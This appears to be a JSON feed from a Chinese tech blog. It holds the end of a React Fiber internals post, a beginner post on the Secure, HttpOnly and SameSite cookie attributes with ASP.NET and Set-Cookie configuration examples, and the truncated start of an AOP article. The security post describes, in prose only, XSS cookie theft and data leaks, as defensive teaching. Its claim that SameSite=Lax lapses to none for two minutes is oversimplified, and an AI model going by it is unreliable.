(更新)。</p>\n<p>而執行完後的 current tree 將會被放到 finishedWork tree 中。</p>\n<p>而在此階段將會觸發以下操作：</p>\n<ul>\n<li>執行 getSnapshotBeforeUpdate event</li>\n<li>執行 componentWillUnmount event</li>\n<li>執行所有 DOM 操作</li>\n<li>將 finishedWork tree 設置為 current tree</li>\n<li>執行 componentDidMount event</li>\n<li>執行 componentDidUpdate event</li>\n</ul>\n<h3 id=\"dom-%E6%9B%B4%E6%96%B0\"><a class=\"direct-link\" href=\"#dom-%E6%9B%B4%E6%96%B0\">#</a> Dom 更新</h3>\n<p><a href=\"https://github.com/facebook/react/blob/95a313ec0b957f71798a69d8e83408f40e76765b/packages/react-reconciler/src/ReactFiberScheduler.js#L376\">commitAllHostEffects</a> 是React在其中執行DOM更新的函數。該函數定義了 Dom 需要執行的操作類型。</p>\n<h2 id=\"%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\"><a class=\"direct-link\" href=\"#%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\">#</a> 較少在用 class component ，那來談談 function component</h2>\n<p>時至今日，function component 搭配 hooks 幾乎已成了主流，而 function component 在渲染時可以避免多餘的判斷 (<a href=\"https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L1306\">mountIndeterminateComponent</a>)</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p10.png\" alt=\"RE: React hooks\"><br>\n<a href=\"https://medium.com/the-guild/under-the-hood-of-reacts-hooks-system-eb59638c9dba\">under-the-hood-of-reacts-hooks-system</a></p>\n<p>而大家常用的 <a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiberHooks.new.js\">hook</a> 則會形成 hook 鍊，保存在 Fiber 的 memoizedState 中，通過 dispatcher 去更新 fiber 內的 state 及 effect 狀態：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> hook<span class=\"token operator\">:</span> Hook <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  memoizedState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">// hook 的狀態</span><br>  baseState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始 state</span><br>  baseQueue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始 queue</span><br>  queue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//需要更新的update</span><br>  next<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//下一個hook</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre>\n<p>例如 const [state, updateState] = useState(initialState)， memoizedState 就是 initialState。</p>\n<p>每個 hook 都會被放到 queue 當中。當您調用 setState 函數時，React 其實不會立即調用 updater 函式，而是將其保存在隊列中並安排重新渲染。</p>\n<!-- 至於優化常用的 [useMemo](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L370) 則會將元件改為較為[淺層的比對](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L456) -->\n<h3 id=\"%E5%8F%83%E8%80%83\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83\">#</a> 參考</h3>\n<p><a href=\"https://segmentfault.com/a/1190000039225217\">https://segmentfault.com/a/1190000039225217</a><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a><br>\n<a href=\"https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react\">https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react</a><br>\n<a href=\"https://www.bilibili.com/video/av48384879/\">https://www.bilibili.com/video/av48384879/</a></p>\n<p>延伸閱讀<br>\n<a href=\"https://segmentfault.com/a/1190000017241034?utm_source=sf-related\">https://segmentfault.com/a/1190000017241034?utm_source=sf-related</a></p>\n",
      "date_published": "2021-05-28T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/",
      "title": "零基礎資安系列（三）-網站安全三本柱（Secure &amp; SameSite &amp; HttpOnly）",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p><strong>保護 Cookie守衛網站安全的三本柱有不同的職責和能力</strong><br>\nSecure 表示：我不會讓 Cookie去任何危險的地方！<br>\nHttpOnly 表示：只要有我在的地方 <em>別想找到</em> Cookie！<br>\nSameSite 表示：所有和 Cookie 來源不同的請求都別想成功！</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> 釋例</h2>\n<p>今天要聊的這三種屬性，可以說是在網頁安全的防護上 CP 值最高的設定，想讓你了解瀏覽器為什麼需要這三種設定，而這三種屬性又為什麼會被稱為網站安全三本柱，他們擁有甚麼樣的功能和要如何進行設定，這些是我希望今天能帶給你的小知識，那麼話不多說，就讓我們繼續看下去。</p>\n<h3 id=\"secure\"><a class=\"direct-link\" href=\"#secure\">#</a> Secure</h3>\n<p><strong>Secure</strong> 應該是屬於三本柱中最單純的一位，他的訴求很簡單，所有只要網站開頭不是 https 開頭的網站都沒有辦法獲得 Cookie 中的資訊，舉例來說：</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p1.png\" alt=\"\"></p>\n<p>網站的 Cookie 儲存了5個值，無論是網站本身的配置錯誤讓你可以選擇使用 https 或 http 瀏覽，還是攻擊者把你重導向到他在網站子域建立的未加密的惡意 http 網址裡，基本上在 http 中網站能獲得的，只會剩下第一個 Secure 沒有打勾的值，因為 Secure 會阻止所有他有打勾的值出現在 http 中，最直觀的感受就是，當你不小心連接到 http 的頁面中的時候他會把你登出，因為他找不到可以證明你身分的那些 Cookie 的值，這個時候千萬別傻傻的再登入一次，因為在 http 中傳送的資料可都是未加密的阿！</p>\n<h3 id=\"httponly\"><a class=\"direct-link\" href=\"#httponly\">#</a> HttpOnly</h3>\n<p>而 <strong>HttpOnly</strong> 則可以說他是 XSS 之敵，如果有看過我的 <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">基礎第二篇 XSS 攻擊介紹</a> 的朋友，可以發現在 XSS 攻擊中，網站會允許攻擊者在網站中植入惡意的 JavaScript 藉此竊取使用者的 Cookie ，舉例來說：</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p2.png\" alt=\"\"></p>\n<p>網站的 Cookie 儲存了5個值，當攻擊者在有 XSS 攻擊漏洞中的網站植入惡意程式時，例如前端常用來查詢 Cookie 的 JavaScript 指令 document.cookie ，就是攻擊者最常使用的攻擊方式，攻擊者會在網站中執行 document.cookie 並將結果傳送給攻擊者，但如果我的網站中對敏感的 Cookie 值設定了 HttpOnly 會發生甚麼事？</p>\n<p>攻擊者會發現即使網站有 XSS 漏洞，也成功的植入了惡意程式，但卻沒有將你受到 HttpOnly 保護的 Cookie 值傳送回來，為什麼會這樣呢？</p>\n<p>原因是因為 HttpOnly 的功能就是拒絕與 JavaScript 共享 Cookie ，當 Cookie 中包含了設定 HttpOnly 的值之後，HttpOnly 會拒絕這個請求，藉此來保護 Cookie 不被不受信任的 JavaScript 存取，可以稱他為當之無愧的 XSS 之敵。</p>\n<p>不過額外一提，並不是只要設置了 HttpOnly 之後，即使網站有 XSS 漏洞也可以高枕無憂，曾經碰過一個實例是當某網站搜尋的產品 ID 錯誤時，網站會將當下頁面的所有資訊紀錄在頁面上（包含 Cookie）方便工程師除錯，於是攻擊者便在網站中嵌入一個當使用者進入頁面時預設搜尋一個錯誤的產品 ID 並將整個當下頁面傳送給攻擊者的惡意程式，除了 Cookie 以外還附贈了伺服器版本和套件版本，直接就是一個資訊洩漏大禮包。</p>\n<h3 id=\"samesite\"><a class=\"direct-link\" href=\"#samesite\">#</a> SameSite</h3>\n<p>講到這邊可能有人會問，如果有 <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">XSS</a> 之敵，那 CSRF 是不是也有？當然有！工程師也有同樣的疑問，於是 SameSite 這個 CSRF 之敵也出現了！</p>\n<p>那這個最晚才誕生的瀏覽器安全屬性有甚麼特別之處，可以被稱為 CSRF 之敵？在我的 <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">資安零基礎系列第一篇 CSRF 攻擊介紹</a> 中，可以很清楚的了解到， CSRF 的特性在於攻擊者跨 Domain 向網站提出請求，而網站無條件信任 Cookie 而沒有再確認或以其他方式驗證，只知道這個 Request 帶著某個使用者的 Cookie，便接受了這個 Request ，卻不會去確認這個 Request 是不是由使用者自願發出的（ 就像是菜單上的桌號是你的，但不代表這個菜是你點的 ）。</p>\n<p>那你一定會想，那如果只要不是我執行操作的這個 Domain 上發送的所有 Request ，網站都通通丟掉不接受不就好了（ 只要不是坐在店裡的人給老闆的菜單老闆都直接丟掉）？</p>\n<p>沒錯！這就是 SameSite 這個屬性的特性，瀏覽器會檢查 Request 的來源是否與發布 Cookie 的來源相同。<br>\n如果不是，瀏覽器就不會在 Request 中包含Cookie，因此便可以從根本上 CSRF 的攻擊來阻止。</p>\n<p>但即使如此， SameSite 其實還是有破綻，以自身經歷來說，曾經遇過一個網站設置了 SameSite 卻沒有設定 HttpOnly ，因此攻擊者只要在網站中嵌入一個讓使用者自己執行 document.cookie ，並將執行完成的結果送給攻擊者的惡意程式，於是攻擊者一樣可以拿到使用者所有的 Cookie 資料。</p>\n<p>也許你會說，這個黑鍋 SameSite 不背，這是 HttpOnly 要負的責任，這樣說當然沒錯，因為三個屬性沒有共存的確會產生預期外的安全風險，不能說這是 SameSite 的錯，但 SameSite 還真有其他的弱點，如果設定的值是 Lax 的話，只要在網站導頁後的兩分鐘內，瀏覽器為了避免破壞到某些網站的登入流程和使用者體驗， SameSite 的設定會變成 none ，也就是沒設的意思。</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p3.png\" alt=\"\"></p>\n<p>所以如果可以的話，建議除了設定 SameSite 以外，再加上 CSRF Token 會更有效的防範 CSRF 的攻擊。</p>\n<h2 id=\"%E5%AF%A6%E4%BD%9C%E4%B8%89%E6%9C%AC%E6%9F%B1\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BD%9C%E4%B8%89%E6%9C%AC%E6%9F%B1\">#</a> 實作三本柱</h2>\n<p>說了這麼多，想必到這邊你應該也對這三種瀏覽器的安全屬性有了一定的認識，有道是坐而言不如起而行，讀萬卷書不如行萬里路！</p>\n<p>有點尷尬不過總而言之，來介紹實作！</p>\n<h3 id=\"secure-%26-httponly\"><a class=\"direct-link\" href=\"#secure-%26-httponly\">#</a> Secure &amp; HttpOnly</h3>\n<h3 id=\"%E7%AC%AC%E4%B8%80%E6%AD%A5\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E6%AD%A5\">#</a> 第一步</h3>\n<p>確保自己的網站是 Https SSL ，否則你會發現你的網站一直在把使用者登出，相關設置可以參考官方文件 <a href=\"https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis\">How to Set Up SSL</a></p>\n<h3 id=\"%E7%AC%AC%E4%BA%8C%E6%AD%A5\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E6%AD%A5\">#</a> 第二步</h3>\n<p>設定Secure &amp; HttpOnly有很多種方法，我這邊以 <code>ASP.NET</code> 來舉例，修改你的 <code>web.config</code>，新增：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;system.web>  <br> &lt;httpCookies httpOnlyCookies=”true” requireSSL=”true” />  <br>&lt;system.web><br><br>requireSSL=”true” 設定 Secure ，<br><br>httpOnlyCookies=”true” 設定 HttpOnly</code></pre>\n<p>這樣設定完後，就完成了 Secure &amp; HttpOnly 的設定！</p>\n<h3 id=\"samesite-2\"><a class=\"direct-link\" href=\"#samesite-2\">#</a> SameSite</h3>\n<p>SameSite 的屬性可以進行三種設定</p>\n<p><strong>Strict</strong>：這是限制最嚴格的設定，會完全禁止第三方的 Cookie 請求，基本上只有在網域和 URL 中的網域相同，才會傳遞 Cookie 請求，舉例來說，當網站裡有一個 FB 連結時，點開連結，使用者必須要再登入一次 FB ，因為網站沒有傳送任何 FB 的 Cookie 。</p>\n<p>這是三種設定中最嚴謹也最安全的設定，但也因此會讓使用者在網站的使用體驗上變得比較不方便，通常會使用於銀行或是購物網站等有金流交易的網站上。</p>\n<p>設定的方法為在 Server 上進行設定</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Set-Cookie: CookieName=CookieValue; SameSite=Strict;</code></pre>\n<p><strong>Lax</strong>：而也因為了 Strict 的嚴格，所以有了 Lax 這個比較符合使用者使用體驗上的值產生， Lax 的要求同樣會限制大多數的第三方請求，但 Lax 會允許 Get 的請求，以表單來舉例：</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p4.png\" alt=\"\"></p>\n<p>和 none 的全部允許與 Strict 的全部不允許來說， Lax 禁止了比較不安全的 POST 請求，卻又有一定的安全性，因此是 SameSite 目前在應用上較常出現的設定值，而2020年2月發布的 Chrome 80 以後皆是預設網站以 Lax 進行設定。</p>\n<p>設定的方法為在 Server 上進行設定</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Set-Cookie: CookieName=CookieValue; SameSite=Lax;</code></pre>\n<p><strong>None</strong>：這個值顧名思義就是不限制 Cookie 傳送的意思，不過如果在網站上想要將 SameSite 的值設定為 None 的話，網站中的 Secure 必須要是開啟的， None 的設定才會生效，算是瀏覽器為了網站的安全性上做的一些小限制。</p>\n<p>設定的方法為在 Server 上進行設定</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Set-Cookie: widget\\_session=abc123; SameSite=None; Secure</code></pre>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>在瀏覽器上這三種屬性的設定對工程師來說，成本不高但達成的效果卻不小，因此可以說是網站安全的入門經典款配置，不過也正我如前面所說，三個屬性沒有共存有可能會產生預期外的安全風險，所以如果可以的話，請盡可能的將這三種屬性都進行設定。</p>\n<p>此外，值得注意的一點是 SameSite 的設定不只是在 Cookie 的送出上，其實也會影響到 Cookie 的寫入，如果需要在使用者的使用體驗上進行衡量的話，建議除非是銀行或是購物網站等有金流交易的網站，否則一般的網站其實只要設定 Lax 的值並搭配 CSRF Token 就已經擁有較高層級的 CSRF 攻擊防護了。</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> 延伸閱讀</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\">#</a> 零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery ）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">認識 CSRF（Cross Site Request Forgery）</a></p>\n</blockquote>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> 零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">認識 XSS（Cross-Site Scripting）</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h2>\n<h3 id=\"httpcookies-element\"><a class=\"direct-link\" href=\"#httpcookies-element\">#</a> httpCookies Element</h3>\n<blockquote>\n<p><a href=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262%28v=vs.100%29?redirectedfrom=MSDN\">https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)?redirectedfrom=MSDN</a></p>\n</blockquote>\n<h3 id=\"how-to-set-up-ssl\"><a class=\"direct-link\" href=\"#how-to-set-up-ssl\">#</a> How to Set Up SSL</h3>\n<blockquote>\n<p><a href=\"https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis\">https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis</a></p>\n</blockquote>\n<h3 id=\"cookie-%E7%9A%84-samesite-%E5%B1%AC%E6%80%A7\"><a class=\"direct-link\" href=\"#cookie-%E7%9A%84-samesite-%E5%B1%AC%E6%80%A7\">#</a> Cookie 的 SameSite 屬性</h3>\n<blockquote>\n<p><a href=\"https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html\">https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html</a></p>\n</blockquote>\n",
      "date_published": "2021-05-28T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/maxchiu/aop/",
      "url": "https://tech-blog.cymetrics.io/posts/maxchiu/aop/",
      "title": "來談談 AOP (Aspect-Oriented Programming) 的精神與各種主流實現模式的差異",
      "content_html": "<p>這篇文章將從 AOP 的核心思想談到目前主流實現 AOP 的不同策略並比較他們的差異，適合了解 Java 語言或者有稍微玩過 AOP 但是不清楚其原理的人閱讀。</p>\n<p>隨著軟體專案規模的擴大，程式碼的維護基本上已經變成了一個世紀難題，學界和業界一直以來都持續許多降低程式碼維護難度的方案。 <a href=\"https://en.wikipedia.org/wiki/Aspect-oriented_programming\">AOP ( Aspected-Oriented Programming )</a> 作為一個在上世紀末就被提出的編程典範，這數十年來也經歷了許多的轉變。</p>\n<!-- summary -->\n<p>這篇文章會先討論 AOP 的行為本質，並剖析 Java 語言中 AOP 實現的幾種模式，並且比較彼此之間的行為。</p>\n<!-- summary -->\n<h4 id=\"aop-%E7%9A%84%E6%9C%AC%E8%B3%AA-%E2%80%94-%E6%94%B9%E8%AE%8A%E7%A8%8B%E5%BC%8F%E7%A2%BC%E7%9A%84%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#aop-%E7%9A%84%E6%9C%AC%E8%B3%AA-%E2%80%94-%E6%94%B9%E8%AE%8A%E7%A8%8B%E5%BC%8F%E7%A2%BC%E7%9A%84%E6%B5%81%E7%A8%8B\">#</a> AOP 的本質 — 改變程式碼的流程</h4>\n<p>以 Web Server 開發場景為例，我們經常會需要在很多 end-point API 的方法執行前先執行權限驗證，或者是在這些 end-point 執行 transaction 失敗時可以 rollback。</p>\n<p>這些在程式碼中會重複出現，它們是重要但是不屬於我們核心業務的操作，如果要重複複製貼上到專案中的各處會造成難以維護的窘境。因此 AOP 試圖讓這些常被複用的邏輯獨立出來，用特殊的機制包裝起來，讓我們的業務邏輯不需要去看到任何相關的程式碼。</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/0____Bm36Dv5mm97e2vF.jpg\" alt=\"\"></p>\n<p>這件事本質上聽起來跟呼叫函式沒有太大的區別，然而 AOP 本質上是屬於一種 <a href=\"https://en.wikipedia.org/wiki/Metaprogramming\">Meta Programming</a> 。具體來說，實現 AOP 的工具處理的是程式碼本身（或 bytecode本身） 或是 class (或 object ) 的資訊，是用來改變程式碼的流程或織入（ weaving ) 新的程式碼，而非只是單純地「執行一段程式」。</p>\n<p>AOP 只是種指導編程模式的原則而已，在不同的語言和生態系中，類似的概念都有不同的實作方式，然而共通點都是藉由改變程式碼的流程讓核心邏輯不會受到額外的切面邏輯的影響。</p>\n<p>在靜態語言中，程式的流程在編譯時期就會被寫死了，要穿插切面在程式碼各處會需要有額外的工具來支持。而在動態語言中，因為程式的流程並不是在編譯時期就被決定了，而是可以動態更改的，所以通常原生語法就支持了 AOP 功能。</p>\n<p>以 Python 為例，Python內建的 decorator 修飾詞可以將被切入 （ advised ) 的函式直接傳入別的函式，並且藉由回傳另一個已經被修飾完成的函式物件來實現 AOP （ 至於這究竟是不是一種 <a href=\"https://en.wikipedia.org/wiki/Decorator_pattern\">Decorator Pattern</a> 的實現，可以參 考 [2] 的討論）</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">decorator</span><span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">def</span> <span class=\"token function\">wrapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>        <span class=\"token comment\"># 執行前的關注切面, </span><br>        func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>        <span class=\"token comment\"># 執行後的關注切面</span><br>    <span class=\"token keyword\">return</span> wrapper<br><br><span class=\"token decorator annotation punctuation\">@decorator</span><br><span class=\"token keyword\">def</span> <span class=\"token function\">decorated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token comment\"># 核心業務邏輯</span></code></pre>\n<p>而在 Javascript 來說， ES7 之後也開始支援跟 Python 類似語法的 decorator。</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">decorator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">target</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// 執行前的關注切面</span><br>    <span class=\"token function\">target</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token comment\">// 執行後的關注切面</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br>@decorator<br><span class=\"token keyword\">function</span> <span class=\"token function\">decorated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">// do something</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>同時，如果用過 React 的話，可能會對 HOC ( Higher Order Component) 有印象， 以我自己的角度來看，HOC 在本質上其實很接近 AOP。</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">withExtraProps</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">Component</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>props <span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><br>    <span class=\"token operator\">&lt;</span>Component <span class=\"token punctuation\">{</span><span class=\"token operator\">...</span>props<span class=\"token punctuation\">}</span> extraProps<span class=\"token operator\">=</span><span class=\"token string\">\"Hello~\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span><br>  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">const</span> ComponentWithExtraProps <span class=\"token operator\">=</span> <span class=\"token function\">withExtraProps</span><span class=\"token punctuation\">(</span>Component<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">const</span> instance <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>CComponentWithExtraProps defaultProp<span class=\"token operator\">=</span><span class=\"token string\">\"test\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span></code></pre>\n<p>接著讓我們來看看靜態語言實現 AOP 有哪些不同的手段。 大體可以分為 “ Run-time AOP ” 跟 “ Compile-time AOP ” 。文章以下的部分將介紹 Java 生態系中不同的 AOP 實現取徑。</p>\n<h4 id=\"compile-time-aop-%E2%80%94-aspectj-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#compile-time-aop-%E2%80%94-aspectj-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\">#</a> Compile-Time AOP — AspectJ 中的策略</h4>\n<p><a href=\"http://eclipse.org/aspectj/\">AspectJ</a> 是由 Eclipse Foundation 所維護的，Java生態系中最泛用的 AOP 工具。我會先簡述 AspectJ 的運作概念，接著在後面給出實作和反組譯的實際範例。</p>\n<p>簡單說明 AspectJ 的使用情境會是這樣：我們有一個物件類別定義要被複用的切面邏輯（ e.g. AuthorizeAspect ），另一個物件類別執行業務邏輯。這兩個類別彼此在 source code 中是沒有直接的關連的（只有 meta information，例如 @ annotation 標註其為切入點或切入函式 ) ，但在程式碼執行前我們可以用 AspectJ 套件自動生成將兩者關聯起來的 bytecode ，並且在正確的位置插入這些 bytecode 。</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/1__1o3LETcmZrvDa__1I__h9roQ.png\" alt=\"\"></p>\n<p>AspectJ 實現 AOP 的方式主要是所謂的 Compile-time AOP。在建置時使用 AspectJ 的插件 ( e.g. aspectj-maven-plugin )，或是在執行前讓 JavaAgent呼叫 AspectJWeaver 將 aspects 織入到 classfile。<br>\n並且在執行期用 aspectJ 的 Runtime library ( e.g. aspectjrt ) 作為 Trampoline 來將程式的 Control flow 在正確的時間點跳轉給對應的 Advice。</p>\n<p>AspectJ 可以指名在不同的時間點執行 aspects 的織入。</p>\n<ul>\n<li>Compile Time Weaving<br>\n在編譯時就把 aspects 跟你的原始碼一起從用專屬的編譯器 (ajc) 直接編譯成包含了 aspects 的 classfile。這個操作可以是 java -&gt; class (有源碼的情況) 或是 class -&gt; class ( 織入第三方jar檔的狀況 )<br>\n這麼做的好處很明顯，就是只要 ajc 編譯好了，之後 run 的時候都不會有額外的 weaving overhead。但壞處就是如果要關閉或開啟某些 aspect，就必須整包重新 compile。</li>\n</ul>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/0__O0jiGBeR8PEv__63Z.jpg\" alt=\"\"></p>\n<ul>\n<li>Load-Time Weaving<br>\n相對地，load-time weaving 藉由定義額外的 aspect config file (下圖中的 aop.xml) ，把 weaving的操作推遲到 JVM 的 classloader load classfile 時才把對應的 aspect 織入。 這樣的操作優勢也很明顯，就是不需要每次調整 aspect 的 config 時都需要整個專案重新 compile 。</li>\n</ul>\n<p>如果對於 Compile-Time Weaving 跟 Load-Time Weaving 的執行效率差異有興趣的話，[4] 是個 benchmark 可以參考。</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/0__RMHhvccYDP2ziXr3.jpg\" alt=\"\"></p>\n<p>讓我們用程式碼看看 AspectJ 具體的行為。考慮以下的 dummy 函式，我們定義了一個 Authorize Aspect ，希望在執行 dummy 函式之前以及之後，都能夠執行 Authorize 相關的邏輯，因此聲明了 before 和 after 的切入點。</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Authorize</span><br><span class=\"token keyword\">public</span> <span class=\"token class-name\">User</span> <span class=\"token function\">createNewUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> id<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> email<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InValidEmailException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"some task\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Aspect</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span 